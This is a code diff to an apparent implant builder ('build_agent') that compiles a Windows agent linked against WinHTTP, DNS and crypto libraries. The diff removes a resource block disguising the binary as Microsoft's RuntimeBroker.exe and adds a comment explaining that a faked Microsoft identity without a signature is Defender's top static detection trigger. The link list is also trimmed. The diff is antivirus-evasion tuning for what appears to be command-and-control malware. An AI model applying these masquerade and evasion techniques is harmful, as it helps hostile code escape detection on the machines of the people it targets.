@@ -326,37 +326,10 @@ def build_agent(
     windres = "x86_64-w64-mingw32-windres" if arch == "x64" else "i686-w64-mingw32-windres"
     res_obj = None
 
+    # No version info block — claiming to be a Microsoft binary without a valid
+    # Authenticode signature is the #1 static detection trigger in Defender.
+    # Only embed the application manifest (asInvoker + DPI aware).
     rc_content = r"""
-#include <winver.h>
-
-VS_VERSION_INFO VERSIONINFO
-FILEVERSION     10,0,22621,1
-PRODUCTVERSION  10,0,22621,1
-FILEFLAGSMASK   VS_FFI_FILEFLAGSMASK
-FILEFLAGS       0
-FILEOS          VOS_NT_WINDOWS32
-FILETYPE        VFT_APP
-BEGIN
-    BLOCK "StringFileInfo"
-    BEGIN
-        BLOCK "040904B0"
-        BEGIN
-            VALUE "CompanyName",      "Microsoft Corporation"
-            VALUE "FileDescription",  "Runtime Broker"
-            VALUE "FileVersion",      "10.0.22621.1 (WinBuild.160101.0800)"
-            VALUE "InternalName",     "RuntimeBroker.exe"
-            VALUE "LegalCopyright",   "\251 Microsoft Corporation. All rights reserved."
-            VALUE "OriginalFilename", "RuntimeBroker.exe"
-            VALUE "ProductName",      "Microsoft\256 Windows\256 Operating System"
-            VALUE "ProductVersion",   "10.0.22621.1"
-        END
-    END
-    BLOCK "VarFileInfo"
-    BEGIN
-        VALUE "Translation", 0x409, 1200
-    END
-END
-
 1 24 BEGIN
 "<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?>\r\n"
 "<assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0"">\r\n"
@@ -405,7 +378,7 @@ END
     cmd += [
         "-lbcrypt", "-lwinhttp", "-ladvapi32", "-lkernel32", "-lntdll",
         "-ldnsapi", "-lole32", "-loleaut32", "-liphlpapi", "-lws2_32",
-        "-lgdi32", "-lcredui", "-luser32", "-ldbghelp", "-lshlwapi",
+        "-lgdi32", "-luser32",
         "-static-libgcc",
         "-Wl,--subsystem,windows",
         "-Wl,--gc-sections",
